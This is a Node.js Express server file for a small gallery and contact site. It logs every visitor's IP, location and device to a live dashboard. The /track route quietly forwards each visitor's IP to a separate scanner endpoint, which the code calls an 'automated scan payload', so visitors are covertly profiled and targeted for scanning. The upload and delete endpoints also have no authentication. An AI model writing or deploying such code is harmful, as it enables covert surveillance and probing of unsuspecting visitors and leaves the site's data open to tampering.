import "dotenv/config";
import express from "express";
import cors from "cors";
import http from "http";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import { Server } from "socket.io";
import { createClient } from "@supabase/supabase-js"; 
import requestIp from "request-ip";
import morgan from "morgan";
import multer from "multer";    // 🟢 تم إضافة المستورد المفقود لحل مشكلتك حالياً
import geoip from "geoip-lite";  // 🟢 تم إضافة هذا أيضاً لمنع الخطأ القادم الخاص با
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = process.env.PORT || 7860; 

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_PUBLISHABLE_KEY
);

app.set('trust proxy', true);

app.use(cors());
app.use(express.json());
app.use(requestIp.mw());
app.use(morgan("dev"));

app.use(express.static(path.join(__dirname, "public")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

if (!fs.existsSync("uploads")) fs.mkdirSync("uploads");

const storage = multer.diskStorage({
  destination: (req, file, cb) => { cb(null, "uploads/"); },
  filename: (req, file, cb) => {
    const name = Date.now() + "-" + Math.round(Math.random() * 100000);
    cb(null, name + path.extname(file.originalname));
  }
});
const upload = multer({ storage });

let onlineUsers = 0;

io.on("connection", (socket) => {
  onlineUsers++;
  io.emit("online-users", onlineUsers);
  socket.on("disconnect", () => {
    onlineUsers--;
    io.emit("online-users", onlineUsers);
  });
});

function getRealVisitorIp(req) {
  let ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.clientIp;
  if (ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
  
  const localIps = ['127.0.0.1', '::1', '0.0.0.0'];
  const myOwnIp = '156.206.237.111'; 

  if (localIps.includes(ip) || ip === myOwnIp || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return null; 
  }
  return ip;
}

function forwardToLocalScanner(ip) {
  const localScannerUrl = process.env.LOCAL_SCANNER_URL; 

  if (!localScannerUrl) {
    console.log("[⚠️] LOCAL_SCANNER_URL is not set. Skipping automated scan payload.");
    return;
  }

  const finalTargetUrl = localScannerUrl.endsWith("/") 
    ? `${localScannerUrl}scan-auto` 
    : `${localScannerUrl}/scan-auto`;

  fetch(finalTargetUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip: ip })
  })
  .then(res => res.json())
  .then(data => console.log(`Base Sync response:`, data))
  .catch(() => {}); 
}

app.get("/track", async (req, res) => {
  try {
    let ip = getRealVisitorIp(req);
    
    // 🟢 [تم الإصلاح]: جلب الـ IP الاحتياطي بصيغة تمنع انهيار السيرفر نهائياً
    if (!ip) {
      try {
        const externalRes = await fetch("https://ipify.org");
        const externalData = await externalRes.json();
        ip = externalData.ip;
      } catch { ip = "197.34.0.0"; }
    }

    const geo = geoip.lookup(ip);
    
    const visitor = { 
      ip, 
      country: geo?.country || "Unknown", 
      city: geo?.city || "Unknown", 
      device: req.headers["user-agent"]?.includes("Mobi") ? "Mobile" : "Desktop", 
      page: req.query.page || "Home", 
      user_agent: req.headers["user-agent"] || "Unknown"
    };

    io.emit("new-visit", { ...visitor, time: new Date() });

    const { error: sbError } = await supabase
      .from("visits")
      .insert(visitor);
      
    if (sbError) console.error("⚠️ Supabase Sync Error:", sbError.message);

    forwardToLocalScanner(ip);

    res.json({ success: true });
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.get("/api/images", async (req, res) => {
  try {
    const { data: images, error } = await supabase.from("images").select("*").order("time", { ascending: false });
    if (error) throw error;
    res.json(images || []);
  } 
  catch (error) { res.status(500).json({ error: error.message }); }
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: "No file" });
    
    const image = { 
      filename: req.file.filename, 
      path: "/uploads/" + req.file.filename, 
      desc: req.body.desc || "بدون وصف", 
      position: "none"
    };

    const { error } = await supabase.from("images").insert(image);
    if (error) throw error;

    const { data: allImages } = await supabase.from("images").select("*").order("time", { ascending: false });
    io.emit("refresh-gallery", allImages);
    
    res.json({ success: true });
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.post("/api/image/position", async (req, res) => {
  try {
    const { id, position } = req.body;
    if (position === "top") { 
      await supabase.from("images").update({ position: "bottom" }).eq("position", "top");
    }
    await supabase.from("images").update({ position }).eq("id", id);
    
    const { data: allImages } = await supabase.from("images").select("*").order("time", { ascending: false });
    io.emit("refresh-gallery", allImages);
    res.json({ success: true });
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.delete("/image/:id", async (req, res) => {
  try {
    const imgId = req.params.id;
    const { data: image } = await supabase.from("images").select("*").eq("id", imgId).single();
    
    if (image) { 
      const fullPath = path.join(__dirname, "uploads", image.filename); 
      if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); 
      await supabase.from("images").delete().eq("id", imgId);
      
      const { data: allImages } = await supabase.from("images").select("*").order("time", { ascending: false });
      io.emit("refresh-gallery", allImages); 
    }
    res.json({ success: true });
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.post("/message", async (req, res) => {
  try { 
    const data = { 
      phone: req.body.phone || "غير محدد", 
      message: req.body.message || "لا يوجد نص", 
      country: req.body.country || "غير محدد", 
      city: req.body.city || "غير محدد", 
      ip: req.headers['x-real-ip'] || req.clientIp || "0.0.0.0"
    }; 

    const { data: insertedData, error } = await supabase.from("messages").insert(data).select().single();
    if (error) throw error;

    io.emit("new-message", insertedData); 
    res.json({ success: true }); 
  } 
  catch (error) { res.status(500).json({ error: error.message }); }
});

app.delete("/message/:id", async (req, res) => {
  try { 
    await supabase.from("messages").delete().eq("id", req.params.id);
    io.emit("delete-message", req.params.id); 
    res.json({ success: true }); 
  } 
  catch (error) { res.status(500).json({ error: error.message }); }
});

app.get("/dashboard", (req, res) => { res.sendFile(path.join(__dirname, "public", "dashboard.html")); });

server.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Real Main Cloud Server running perfectly on port ${PORT}`);
});



